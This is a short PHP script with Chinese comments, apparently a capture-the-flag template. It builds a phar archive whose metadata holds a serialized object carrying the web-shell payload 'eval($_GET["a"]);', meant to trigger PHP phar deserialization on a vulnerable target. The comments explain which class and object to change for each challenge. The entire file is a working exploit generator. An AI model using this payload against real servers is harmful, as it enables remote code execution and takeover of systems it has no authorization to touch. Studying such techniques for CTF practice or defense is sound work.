<?php
highlight_file(__FILE__);
class Testobj
{
    var $output='';     //做题时需要变动的地方，看具体题目的类需要变动的地方是什么
}

@unlink('test.phar');   //删除之前的test.phar文件(如果有)
$phar=new Phar('test.phar');  //创建一个phar对象，文件名必须以phar为后缀
$phar->startBuffering();  //开始写文件
$phar->setStub('<?php __HALT_COMPILER(); ?>');  //写入stub
$o=new Testobj();
$o->output='eval($_GET["a"]);';     //做题时需要变动的地方，看具体题目需要实例化的对象是什么
$phar->setMetadata($o);//写入meta-data
$phar->addFromString("test.txt","test");  //添加要压缩的文件
$phar->stopBuffering();
?>
